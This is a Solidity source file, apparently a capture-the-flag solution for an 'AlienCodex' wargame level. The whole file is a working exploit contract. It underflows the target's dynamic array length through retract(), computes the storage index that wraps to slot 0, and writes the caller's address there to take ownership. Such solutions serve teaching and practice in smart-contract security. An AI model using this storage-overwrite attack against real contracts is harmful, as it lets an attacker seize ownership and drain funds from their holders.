// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
    function makeContact() external;
    function retract() external;
}

contract Attack {
    function attack(IAlienCodex target) public {
        target.makeContact();
        target.retract();

        unchecked {
            uint256 index = (2 ** 256 - 1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
            target.revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}
